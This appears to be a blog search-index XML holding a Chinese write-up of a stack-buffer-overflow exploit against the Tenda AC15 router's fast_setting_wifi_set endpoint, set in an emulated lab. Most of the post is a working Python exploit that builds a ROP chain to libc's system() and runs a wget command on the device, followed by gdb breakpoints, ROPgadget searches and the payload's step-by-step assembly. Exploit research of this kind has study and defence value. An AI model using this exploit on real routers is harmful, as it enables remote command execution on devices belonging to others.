<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>tenda_ac15_栈溢出</title>
    <link href="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
    <url>/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/</url>
    
    <content type="html"><![CDATA[<h2 id="tenda-ac15-栈溢出"><a href="#tenda-ac15-栈溢出" class="headerlink" title="tenda ac15 栈溢出"></a>tenda ac15 栈溢出</h2><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><br>target_ip = <span class="hljs-string">&quot;192.168.0.3&quot;</span><br>target_port = <span class="hljs-number">80</span>  <br><br>cmd=<span class="hljs-string">b&quot;wget http://192.168.0.1:8000/&quot;</span><br>libc_base = <span class="hljs-number">0x76dab000</span>   <span class="hljs-comment">#libc.so</span><br>readble_addr= <span class="hljs-number">0x0005BE05</span><br>test= <span class="hljs-number">0x0006707C</span><br>system_offset = <span class="hljs-number">0x5A270</span><br>pop_r0_pc_addr=<span class="hljs-number">0x0003db80</span><br><br>pop_r3_pc = <span class="hljs-number">0x18298</span><br>mov_ro_ret_r3_offset = <span class="hljs-number">0x40CB8</span><br><br>test=<span class="hljs-string">b&#x27;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaa&#x27;</span>+p32(libc_base+readble_addr)+<span class="hljs-string">b&#x27;zaabbaabcaabdaabeaabfaab&#x27;</span>+p32(pop_r3_pc+libc_base) + p32(libc_base + system_offset)  + p32(mov_ro_ret_r3_offset+libc_base)+cmd<br><br>url = <span class="hljs-string">f&quot;http://<span class="hljs-subst">&#123;target_ip&#125;</span>/goform/fast_setting_wifi_set&quot;</span><br>cookie = &#123;<span class="hljs-string">&quot;cookie&quot;</span>: <span class="hljs-string">&quot;password=mnrcvb&quot;</span>&#125;<br><br><span class="hljs-comment">#data = &#123;&quot;ssid&quot;: payload&#125;</span><br>data = &#123;<span class="hljs-string">&quot;ssid&quot;</span>: test&#125;<br>response = requests.post(url, cookies=cookie, data=data)<br></code></pre></td></tr></table></figure><p>模拟略，记得关闭地址随机化</p><p>已知漏洞点在fast_setting_wifi_set的ssid位置</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240808182625027.png" alt="image-20240808182625027"></p><p>危险函数strcpy</p><p>先cyc生成500个坏字符</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240808182942327.png" alt="image-20240808182942327"></p><p>然后gdb调试</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">set</span> arch <span class="hljs-comment">arm</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">endian little</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">sysroot lib</span>/<br>set solib-search-path lib/<br>b <span class="hljs-comment">*0x00066EE0</span>   //<span class="hljs-comment">fast</span>函数开头<br>b <span class="hljs-comment">*0x0006707C</span>   //第一个<span class="hljs-comment">strcpy</span><br>b <span class="hljs-comment">*0x00067090</span>   //第二个<span class="hljs-comment">strcpy</span><br>b <span class="hljs-comment">*0x00067758</span>   //<span class="hljs-comment">fast</span>函数<span class="hljs-comment">pop</span>处<br>target <span class="hljs-comment">remote 192.168.0.3:8866</span><br></code></pre></td></tr></table></figure><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240808183702980.png" alt="image-20240808183702980"></p><p>走到strcpy这里卡住了</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240808183927605.png" alt="image-20240808183927605"></p><p>r1本来是一个地址指针，但是这里被坏字符覆盖了，所以一直跳不过去</p><p>后面要把yaaa处的字符替换成一个libc上的有效的可读地址</p><p>这里在栈上随便找了一个地址给r1，然后继续执行</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240808184411530.png" alt="image-20240808184411530"></p><p>继续执行到pop处，r11的坏字符gaab给了pc，也就是说要把gaab改成我们要跳转的函数的地址</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240808184721294.png" alt="image-20240808184721294"></p><p>修改exp</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">test=b&#x27;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaa&#x27;+p32(<span class="hljs-name">readable_addr</span>)+&#x27;zaabbaabcaabdaabeaabfaab&#x27;+p32(<span class="hljs-name">pop_r3_pc+libc_base</span>)<br></code></pre></td></tr></table></figure><p><strong><code>p32()</code>函数的作用是将一个32位整数（即4个字节）转换为字节串</strong></p><p>p32(pop_r3_pc+libc_base)是如何找到的？</p><p>libc的基地址</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240808185549824.png" alt="image-20240808185549824"></p><p>pop_r3_pc</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">ROPgadget <span class="hljs-attr">--binary</span> libc<span class="hljs-selector-class">.so</span>.<span class="hljs-number">0</span> <span class="hljs-attr">--only</span> <span class="hljs-string">&quot;pop&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240808185802266.png" alt="image-20240808185802266"></p><p>这里执行后会跳转到libc里面</p><p>动调一下看变化，跳到fast函数的pop处</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240808193115421.png" alt="image-20240808193115421"></p><p>继续添加exp</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">test</span>=b<span class="hljs-string">&#x27;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaa&#x27;</span>+p32(readable_addr)+b<span class="hljs-string">&#x27;zaabbaabcaabdaabeaabfaab&#x27;</span>+p32(pop_r3_pc+libc_base)+p32(libc_base + system_<span class="hljs-literal">off</span>set)  + p32(mov_ro_ret_r3_<span class="hljs-literal">off</span>set+libc_base)+cmd<br><br><br><br><br><span class="hljs-attr">cmd</span>=b<span class="hljs-string">&quot;wget http://192.168.0.1:8000/&quot;</span><br></code></pre></td></tr></table></figure><p>mov_ro_ret_r3_offset&#x3D;0x00040CB8</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240808190928759.png" alt="image-20240808190928759"></p><p>为什么要这样？</p><p>继续动调</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240808193738477.png" alt="image-20240808193738477"></p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240808193904029.png" alt="image-20240808193904029"></p><p>执行成功</p><p>!<img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240819002114376.png" alt="image-20240819002114376"></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
